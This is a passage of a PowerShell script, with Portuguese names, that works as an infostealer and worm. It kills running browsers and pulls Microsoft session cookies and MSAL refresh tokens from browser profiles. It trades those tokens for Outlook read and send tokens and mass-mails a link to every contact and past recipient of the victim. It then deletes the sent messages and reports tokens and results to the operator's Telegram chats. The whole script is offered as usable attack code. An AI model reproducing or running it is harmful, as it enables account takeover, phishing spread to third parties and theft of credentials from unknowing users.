                $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
                if ($code -eq 429 -and $attempt -lt 2) {
                    $ra = 2; try { $ra = [int]$_.Exception.Response.Headers["Retry-After"] } catch {}
                    Start-Sleep -Seconds $ra
                } else { break }
            }
        }
        if (-not $j) { break }
        if ($j.value) {
            foreach ($m in $j.value) {
                $visto++
                $deletar = if ($all) { $true } else { ($m.Subject -eq $subject) }
                if (-not $deletar) { continue }
                $ok = $false; $delCode = 0; $delErr = $null
                for ($attempt = 0; $attempt -lt 3; $attempt++) {
                    try {
                        $d = Invoke-WebRequest -Uri "$OWA_API_BASE/me/messages/$($m.id)" -Method Delete `
                            -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
                        $ok = ($d.StatusCode -eq 204)
                        break
                    } catch {
                        $delCode = 0; if ($_.Exception.Response) { $delCode = [int]$_.Exception.Response.StatusCode }
                        $delErr = $null
                        if ($_.Exception.Response) {
                            try { $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); $delErr = $sr.ReadToEnd() } catch {}
                        }
                        if ($delCode -eq 204) { $ok = $true; break }
                        if ($delCode -eq 429 -and $attempt -lt 2) {
                            $ra = 2; try { $ra = [int]$_.Exception.Response.Headers["Retry-After"] } catch {}
                            Start-Sleep -Seconds $ra
                        } else { break }
                    }
                }
                if ($ok) { $apagadas++ }
                else { $falhas += [PSCustomObject]@{ id = $m.id; status = $delCode; erro = $delErr } }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    return @{ apagadas = $apagadas; falhas = $falhas; total_visto = $visto }
}

function Get-Profiles([string]$root) {
    $result = @()
    if (-not (Test-Path $root)) { return $result }
    foreach ($entry in (Get-ChildItem $root -Directory -ErrorAction SilentlyContinue)) {
        $name = $entry.Name
        if ($name -eq "Default" -or $name -like "Profile *") {
            $hasCookies = Test-Path (Join-Path $entry.FullName "Network\Cookies")
            $hasLS      = Test-Path (Join-Path $entry.FullName "Local Storage\leveldb")
            if ($hasCookies -or $hasLS) { $result += @{ Name = $name; Dir = $entry.FullName } }
        }
    }
    if ($result.Count -eq 0) {
        if ((Test-Path (Join-Path $root "Network\Cookies")) -or (Test-Path (Join-Path $root "Local Storage\leveldb"))) {
            $result += @{ Name = (Split-Path $root -Leaf); Dir = $root }
        }
    }
    return $result
}

function Close-Browsers {
    $procs = @("chrome", "msedge", "brave", "opera", "operagx")
    $fechados = @()
    foreach ($p in $procs) {
        $found = Get-Process -Name $p -ErrorAction SilentlyContinue
        if ($found) {
            $found | Stop-Process -Force -ErrorAction SilentlyContinue
            $fechados += $p
        }
    }
    if ($fechados.Count -gt 0) { Start-Sleep -Milliseconds 800 }
    return $fechados
}

function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]$validate) {
    $cookies = Test-MSCookies $pdir
    $ldb = Join-Path $pdir "Local Storage\leveldb"
    $msal = Get-MSALTk $ldb
    $display = $null
    try {
        $pref = Get-Content (Join-Path $pdir "Preferences") -Raw -ErrorAction Stop | ConvertFrom-Json
        $display = $pref.profile.name
    } catch {}

    $readTok = $writeTok = $writeClient = $null
    $validated = $null
    if ($validate -and $msal) {
        $readTok = Exchange-OWATk $msal.rtk $msal.client $OWA_READ_SCOPE
        if ($readTok) {
            $validated = Test-OWATk $readTok
            if ($validated.state -eq "valido") {
                $wt = Get-OWAWriteTk $msal.rtk $msal.client
                if ($wt) { $writeTok = $wt.tk; $writeClient = $wt.mailClient }
            }
        }
    }

    if ($validated -and $validated.state -eq "valido") { $verdict = "LOGADO_VALIDO" }
    elseif ($cookies.ms -or $msal) { $verdict = "LOGADO_SESSAO_VIVA" }
    elseif ($cookies.state -eq "locked") { $verdict = "BLOQUEADO_NAVEGADOR_ABERTO" }
    else { $verdict = "SEM_SESSAO" }

    [PSCustomObject]@{
        navegador   = $browser
        perfil      = $pname
        perfil_nome = $display
        profile_dir = $pdir
        veredito    = $verdict
        cookies_ms  = $cookies.ms
        cookies_outlook = $cookies.outlook
        msal        = [bool]$msal
        msal_client = if ($msal) { $msal.client } else { $null }
        conta       = if ($validated) { $validated.email } else { $null }
        validacao   = $validated
        tk_read  = $readTok
        tk_write = $writeTok
        write_client = $writeClient
        exchange_error = if ($msal -and -not $readTok) { $script:LastExchangeError } else { $null }
        exchange_hint  = if ($msal -and -not $readTok) { Get-ExchangeErrorHint $script:LastExchangeError } else { $null }
        write_exchange_error = if ($msal -and $readTok -and -not $writeTok) { $script:LastExchangeError } else { $null }
    }
}

$validate = -not $NoValidate.IsPresent
$fechados = @()
if ($CloseBrowsers.IsPresent) { $fechados = @(Close-Browsers) }
$results = @()
foreach ($b in $browsers) {
    $profiles = Get-Profiles $b.Root
    foreach ($p in $profiles) {
        $results += Analyze-Profile $b.Name $p.Name $p.Dir $validate
    }
}

$validos    = @($results | Where-Object { $_.veredito -eq "LOGADO_VALIDO" })
$vivos      = @($results | Where-Object { $_.veredito -eq "LOGADO_SESSAO_VIVA" })
$bloqueados = @($results | Where-Object { $_.veredito -eq "BLOQUEADO_NAVEGADOR_ABERTO" })

if ($validos.Count -gt 0) {
    if ($validos.Count -gt 1) {
        $decisao = "MAIS DE UM Outlook logado com token válido -> USAR TODOS: " +
            (($validos | ForEach-Object { "$($_.navegador)/$($_.perfil) ($($_.conta))" }) -join "; ")
    } else {
        $r = $validos[0]
        $decisao = "USAR: $($r.navegador)/$($r.perfil) — conta $($r.conta) (token OWA validado via REST API v2.0 /me)"
    }
}
elseif ($vivos.Count -gt 0) {
    $comErr = @($vivos | Where-Object { $_.exchange_error })
    if ($comErr.Count -gt 0) {
        $decisao = "Sessão viva mas a troca do refresh FALHOU em: " +
            (($comErr | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ") +
            " -> " + ($comErr[0].exchange_hint)
    } else {
        $decisao = "Sessão viva (cookie MSPAuth / refresh MSAL) mas token não validado -> trocar o refresh (scope api://<client de mail do OWA>/.default) em: " +
            (($vivos | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
    }
}
elseif ($bloqueados.Count -gt 0) {
    $decisao = "Perfis com arquivos travados (navegador aberto) -> fechar o navegador e re-executar: " +
        (($bloqueados | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
else { $decisao = "NENHUMA sessão viva encontrada" }

if ($bloqueados.Count -gt 0 -and ($validos.Count -gt 0 -or $vivos.Count -gt 0)) {
    $decisao += " | ATENÇÃO: perfis ainda travados (pode haver OUTRA conta logada ali): " +
        (($bloqueados | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
$comWrite = @($validos | Where-Object { $_.tk_write })
if ($comWrite.Count -gt 0) {
    $decisao += " | WRITE OK (Mail.Send): " + (($comWrite | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
} elseif ($validos.Count -gt 0) {
    $semWrite = @($validos | Where-Object { $_.write_exchange_error })
    if ($semWrite.Count -gt 0) {
        $decisao += " | WRITE FALHOU: " + (Get-ExchangeErrorHint $semWrite[0].write_exchange_error)
    }
}

$envio = $null
if ($SendTo) {
    $sendBody = Resolve-Body $Body $Link
    $sendSubject = if ($Subject) { $Subject } else { $DEFAULT_SUBJECT }
    $src = $validos | Where-Object { $_.tk_write } | Select-Object -First 1
    if ($src) {
        $res = Send-OWAMsg $src.tk_write $SendTo $sendSubject $sendBody
        $envio = [PSCustomObject]@{ de = $src.conta; para = $SendTo; ok = $res.ok; status = $res.status; erro = $res.erro; perfil = "$($src.navegador)/$($src.perfil)" }
    }
    else {
        $cand = ($validos + $vivos) | Where-Object { $_.msal } | Select-Object -First 1
        if ($cand) {
            $msal = Get-MSALTk (Join-Path $cand.profile_dir "Local Storage\leveldb")
            $wtObj = if ($msal) { Get-OWAWriteTk $msal.rtk $msal.client } else { $null }
            $wt = if ($wtObj) { $wtObj.tk } else { $null }
            if ($wt) {
                $res = Send-OWAMsg $wt $SendTo $sendSubject $sendBody
                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $res.ok; status = $res.status; perfil = "$($cand.navegador)/$($cand.perfil)" }
            } else {
                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $false; status = "sem_write"; perfil = "$($cand.navegador)/$($cand.perfil)" }
            }
        } else {
            $envio = [PSCustomObject]@{ de = $null; para = $SendTo; ok = $false; status = "sem_perfil_com_refresh"; perfil = $null }
        }
    }
}

$envioTodos = $null
if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsPresent) {
    $src = $validos | Where-Object { $_.tk_write -and $_.tk_read } | Select-Object -First 1
    if (-not $src) {
        $cand = ($validos + $vivos) | Where-Object { $_.msal } | Select-Object -First 1
        if ($cand) {
            $msal = Get-MSALTk (Join-Path $cand.profile_dir "Local Storage\leveldb")
            $wtObj = if ($msal) { Get-OWAWriteTk $msal.rtk $msal.client } else { $null }
            if ($wtObj) {
                $cand.tk_write  = $wtObj.tk
                $cand.write_client = $wtObj.mailClient
                if (-not $cand.tk_read) { $cand.tk_read = $wtObj.tk }
                if (-not $cand.conta)    { $cand.conta = $wtObj.email }
                $src = $cand
            }
        }
    }
    $subject = if ($Subject) { $Subject } else { $DEFAULT_SUBJECT }
    $body    = Resolve-Body $Body $Link
    if ($src) {
        $quebra = $null
        if ($ToAllRecipients.IsPresent) {
            $r = Get-OWARecipients $src.tk_read $src.conta $MaxMessages
            $contatos = @($r.contatos)
            $quebra = @{ daAgenda = $r.daAgenda; doHistorico = $r.doHistorico; amostra = $r.amostra; scanned = $r.scanned; sentFolderFound = $r.sentFolderFound }
        }
        elseif ($ToAllPeople.IsPresent) {
            $contatos = @(Get-OWAAllPeople $src.tk_read $src.conta $MaxMessages)
        } else {
            $contatos = @(Get-OWAContacts $src.tk_read)
        }
        if ($MaxContacts -gt 0 -and $contatos.Count -gt $MaxContacts) { $contatos = @($contatos | Select-Object -First $MaxContacts) }
        if ($DryRun.IsPresent) {
            $envioTodos = [PSCustomObject]@{
                de = $src.conta; modo = "dryrun"; total = $contatos.Count; enviados = 0; falhas = @()
                destinatarios = $contatos
                perfil = "$($src.navegador)/$($src.perfil)"
            }
            if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
        } else {
            $ok = 0; $falhas = @(); $enviados = @()
            $limite = $false
            foreach ($c in $contatos) {
                $res = Send-OWAMsg $src.tk_write $c.email $subject $body
                if ($res.ok) { $ok++; $enviados += $c.email }
                else {
                    $falhas += [PSCustomObject]@{ email = $c.email; status = $res.status; erro = $res.erro }
                    if ((($res.status -eq 429) -and ($res.erro -match "ErrorExceededMessageLimit")) -or (($res.status -eq 403) -and ($res.erro -match "ErrorAccountSuspend"))) {
                        $limite = $true
                        $erroTrava = if ($res.status -eq 403) { "Conta suspensa (HTTP 403)" } else { "Limite diário atingido (HTTP 429)" }
                        break
                    }
                }
                Start-Sleep -Milliseconds 300
            }
            $naoEnviados = @($contatos | Where-Object { $enviados -notcontains $_.email } | ForEach-Object { $_.email })
            $envioTodos = [PSCustomObject]@{
                de = $src.conta; total = $contatos.Count; enviados = $ok; falhas = $falhas
                perfil = "$($src.navegador)/$($src.perfil)"
            }
            if ($limite) {
                $envioTodos | Add-Member -MemberType NoteProperty -Name limite_atingido -Value $true
                $envioTodos | Add-Member -MemberType NoteProperty -Name erro_trava -Value $erroTrava
            }
            if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
            if (($enviados.Count -gt 0) -or ($naoEnviados.Count -gt 0)) {
                $listaText = Build-ListaText $src.conta $enviados $naoEnviados
                $listaRes = @()
                foreach ($chat in ($ListaChatId -split ',')) {
                    $chat = $chat.Trim()
                    if (-not $chat) { continue }
                    if ($listaText.Length -le 4000) {
                        $listaRes += Send-TgMsg $ListaTok $chat $listaText
                    } else {
                        $bloco = @(); $tam = 0
                        foreach ($linha in ($listaText -split "`n")) {
                            if (($tam + $linha.Length + 1) -gt 4000 -and $bloco.Count -gt 0) {
                                $listaRes += Send-TgMsg $ListaTok $chat ($bloco -join "`n")
                                $bloco = @(); $tam = 0
                            }
                            $bloco += $linha; $tam += $linha.Length + 1
                        }
                        if ($bloco.Count -gt 0) { $listaRes += Send-TgMsg $ListaTok $chat ($bloco -join "`n") }
                    }
                }
                $envioTodos | Add-Member -MemberType NoteProperty -Name lista -Value $listaRes
            }
        }
    } else {
        if ($validos.Count -gt 0) {
            $st = "token de leitura válido, mas SEM token de escrita (Mail.Send) — nada enviado"
            $de = $validos[0].conta
        } else {
            $st = "sem_perfil_com_token"
            $de = $null
        }
        $envioTodos = [PSCustomObject]@{ de = $de; total = 0; enviados = 0; falhas = @(); status = $st }
    }
}

$selfDelReport = $null
if ($SelfDelete.IsPresent -or $SelfDeleteAll.IsPresent) {
    $all = $SelfDeleteAll.IsPresent
    $sdSubject = if ($Subject) { $Subject } else { $DEFAULT_SUBJECT }
    $srcDel = $validos | Where-Object { $_.tk_write } | Select-Object -First 1
    if ($srcDel) {
        Start-Sleep -Seconds 2
        $rd = Remove-OWASentMessages $srcDel.tk_write $sdSubject $all
        $selfDelReport = [PSCustomObject]@{
            de = $srcDel.conta
            modo = if ($all) { "tudo" } else { "por_assunto: $sdSubject" }
            apagadas = $rd.apagadas; falhas = $rd.falhas; total_visto = $rd.total_visto
            perfil = "$($srcDel.navegador)/$($srcDel.perfil)"
        }
    } else {
        $selfDelReport = [PSCustomObject]@{ de = $null; apagadas = 0; falhas = @(); total_visto = 0; status = "sem_write" }
    }
}

$out = [PSCustomObject]@{
    maquina   = $env:COMPUTERNAME
    timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
    navegadores_fechados = $fechados
    decisao   = $decisao
    envio     = $envio
    envio_todos = $envioTodos
    self_delete = $selfDelReport
    perfis    = $results
}

$telegram = $null
if ($TgTok -and $TelegramChatId -and -not $NoTelegram.IsPresent) {
    $telegram = @()
    foreach ($chat in ($TelegramChatId -split ',')) {
        $chat = $chat.Trim()
        if ($chat) { $telegram += Send-TgMsg $TgTok $chat (Build-ReportText $out) }
    }
}
$out | Add-Member -MemberType NoteProperty -Name telegram -Value $telegram
$out | ConvertTo-Json -Depth 6